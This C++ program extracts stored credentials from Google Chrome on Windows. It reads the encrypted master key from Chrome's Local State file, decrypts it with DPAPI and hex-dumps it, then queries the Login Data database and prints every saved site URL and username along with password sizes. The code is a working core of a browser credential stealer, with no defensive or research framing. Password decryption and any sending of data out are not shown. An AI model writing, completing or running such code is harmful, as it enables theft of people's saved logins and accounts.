#include "browser.hxx"
#include "crypto.hxx"
#include "nowide.hxx"
#include <iostream>
#include <fstream>
#include <filesystem>
#include <windows.h>
#include <nlohmann/json.hpp>
#include <sqlite3.h>
//#include <wil/resource.h>

namespace {
void hexdump(const uint8_t *addr, size_t len, const char *desc = NULL);
}

//using unique_sqlite_conn = wil::unique_struct<sqlite3, decltype(&sqlite3_close), sqlite3_close>;
//using unique_sqlite_stmt = wil::unique_struct<sqlite3_stmt, decltype(&sqlite3_finalize), sqlite3_finalize>;

int main() {
    std::wcout << "key path: "     << chrome::key_path << "\n"
               << "logins path: "  << chrome::logins_path << "\n"
               << "cookies path: " << chrome::cookies_path << "\n";

    std::ifstream key_file(chrome::key_path);

    using json = nlohmann::json;
    std::vector<uint8_t> key;
    try {
        json j = json::parse(key_file);
        std::string key_string = j["os_crypt"]["encrypted_key"];
        std::cout << "raw key: " << key_string << "\n";
        key = base64_decode(&key_string[0]);
    } catch (json::exception &) {
        std::wcerr << L"error reading json\n";
        return 1;
    }
    hexdump(&key[0], key.size(), "base64 decoded key");

    key.erase(key.begin(), key.begin() + 5); // TODO vector isn't a good container for this operation
    key = dpapi_decrypt(key);
    hexdump(&key[0], key.size(), "DPAPI decrypted key");

    sqlite3 *db;
    if (sqlite3_open(narrow(chrome::logins_path).c_str(), &db) != SQLITE_OK) {
        std::wcerr << L"couldn't open db. is chrome installed?\n";
        return 1;
    }

    sqlite3_stmt *statement;
    // https://source.chromium.org/chromium/chromium/src/+/main:components/password_manager/core/browser/login_database.cc;drc=4019e81d73554328448bd06db3eeb653080a3fb1;l=312
    if (sqlite3_prepare_v2(db, "SELECT action_url, username_value, password_value FROM logins", -1, &statement, NULL) != SQLITE_OK) {
        std::wcerr << L"error compiling sql statement\n";
        sqlite3_close(db);
        return 1;
    }

    int sql_ret = 0;
    while ((sql_ret = sqlite3_step(statement)) == SQLITE_ROW) {
        std::cout << "action_url: " << sqlite3_column_text(statement, 0) << "\n";
        std::cout << "username: " << sqlite3_column_text(statement, 1) << "\n";
        std::cout << "password size: " << sqlite3_column_bytes(statement, 2) << "\n\n";
    }
    if (sql_ret != SQLITE_DONE) {
        std::wcerr << L"error performing sql query: " << widen(sqlite3_errmsg(db)) << L"\n";
        std::wcerr << L"ret: " << sql_ret << L"\n";
    }

    sqlite3_finalize(statement);
    sqlite3_close(db);
}

namespace {
void hexdump(const uint8_t *addr, size_t len, const char *desc) {
    if (desc) {
        printf("%s:\n", desc);
    }

    const short bytes_per_line = 16;

    char ascii_representation[bytes_per_line] = {0};

    int i;
    for (i = 0; i < len; ++i) {
        if ((i % bytes_per_line) == 0) {
            printf("%08X |", i);
        }

        printf(" %02X", addr[i]);

        if (isprint(addr[i])) {
            ascii_representation[i % bytes_per_line] = addr[i];
        } else {
            ascii_representation[i % bytes_per_line] = '.';
        }

        if ((i % bytes_per_line) == bytes_per_line - 1) {
            // ascii_representation is not null terminated so print exactly bytes_per_line characters
            printf(" | %.*s\n", bytes_per_line, ascii_representation);
        }
    }

    if (i % 16 != 0) {
        // pad last line if not a full 16 bytes
        for (int j = i; j % bytes_per_line != 0; ++j) {
            printf("   ");
        }

        printf(" | %.*s\n", i % bytes_per_line, ascii_representation);
    }
}
}